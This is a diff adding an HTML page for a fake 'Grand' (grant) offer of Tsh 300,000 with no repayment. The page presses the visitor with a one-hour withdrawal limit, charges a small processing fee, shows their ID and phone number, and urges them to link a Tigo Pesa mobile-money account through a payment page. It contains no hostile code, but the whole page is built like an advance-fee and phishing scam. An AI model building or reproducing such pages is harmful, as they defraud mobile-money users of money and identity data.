@@ -1,0 +1,167 @@
+<!-- ✅ Sample dynamic Loan Summary page -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Grand Summary</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+
+    <style>
+        body {
+            background: linear-gradient(to bottom, #f7faff, #e6f0ff);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        .top-box {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+            padding: 12px 18px;
+            font-size: 0.95rem;
+            margin: 20px auto;
+            max-width: 500px;
+            text-align: center;
+        }
+        
+        .top-box a {
+            color: #2563eb;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .loan-summary {
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            padding: 25px;
+            margin: 0 auto 20px;
+            max-width: 500px;
+        }
+        
+        .loan-summary h4 {
+            color: #1e40af;
+            font-weight: 700;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .loan-summary .row {
+            padding: 6px 0;
+            border-bottom: 1px solid #f1f1f1;
+        }
+        
+        .loan-summary .row:last-child {
+            border-bottom: none;
+        }
+        
+        .loan-summary .label {
+            font-weight: 500;
+            color: #444;
+        }
+        
+        .loan-summary .value {
+            font-weight: 600;
+            color: #111;
+            text-align: end;
+        }
+        
+        .btn-apply {
+            background: #2563eb;
+            color: #fff;
+            font-weight: 600;
+            padding: 12px;
+            border-radius: 8px;
+            width: 100%;
+            transition: background 0.3s ease;
+        }
+        
+        .btn-apply:hover {
+            background: #1d4ed8;
+        }
+        
+        .return-home {
+            display: block;
+            margin-top: 12px;
+            color: #2563eb;
+            text-decoration: none;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Top Box -->
+    <div class="top-box">
+        <strong id="userName">Hello</strong>, you are eligible for a GRAND of
+        <a href="#">Tsh 300,000</a> with a <strong>1-Hour time limit to withdraw</strong> to
+        <strong>M-Pesa</strong> number.
+    </div>
+
+    <!-- Loan Summary -->
+    <div class="loan-summary">
+        <h4>Grand Summary</h4>
+        <div class="row">
+            <div class="col-6 label">Grand Type:</div>
+            <div class="col-6 value" id="loanType">Boost Usage</div>
+        </div>
+        <div class="row">
+            <div class="col-6 label">Principal Amount:</div>
+            <div class="col-6 value">Tsh 300,000.00</div>
+        </div>
+        <div class="row">
+            <div class="col-6 label">Interest Amount:</div>
+            <div class="col-6 value">Tsh 00.00</div>
+        </div>
+        <div class="row">
+            <div class="col-6 label">Grand Term:</div>
+            <div class="col-6 value">No Return</div>
+        </div>
+        <div class="row">
+            <div class="col-6 label">Total Repayment:</div>
+            <div class="col-6 value">Tsh 00.00</div>
+        </div>
+        <div class="row">
+            <div class="col-6 label">Processing Fee:</div>
+            <div class="col-6 value">Tsh 200.00</div>
+        </div>
+        <div class="row">
+            <div class="col-6 label">ID Number:</div>
+            <div class="col-6 value" id="idNumber">---</div>
+        </div>
+        <div class="row">
+            <div class="col-6 label">Phone Number:</div>
+            <div class="col-6 value" id="phoneNumber">---</div>
+        </div>
+    </div>
+
+    <!-- Buttons -->
+    <div class="text-center" style="max-width:500px;margin:auto;">
+        <button class="btn btn-apply mb-2" onclick="redirectToPayment()">LINK TIGO PESA TO GET PAYMENT INTO YOUR TIGO ACOUNT</button>
+        <a href="#" class="return-home">Return to Home</a>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        function redirectToPayment() {
+            window.location.href = "payment.html";
+        }
+
+        // ✅ Load details from sessionStorage
+        document.addEventListener("DOMContentLoaded", function() {
+            const name = sessionStorage.getItem('fullName') || 'Hello';
+            const phone = sessionStorage.getItem('phoneNumber') || '---';
+            const idNumber = sessionStorage.getItem('idNumber') || '---';
+            const loanType = sessionStorage.getItem('loanType') || 'Boost Usage';
+
+            document.getElementById('userName').textContent = name;
+            document.getElementById('phoneNumber').textContent = phone;
+            document.getElementById('idNumber').textContent = idNumber;
+            document.getElementById('loanType').textContent = loanType;
+        });
+    </script>
+</body>
+
+</html>
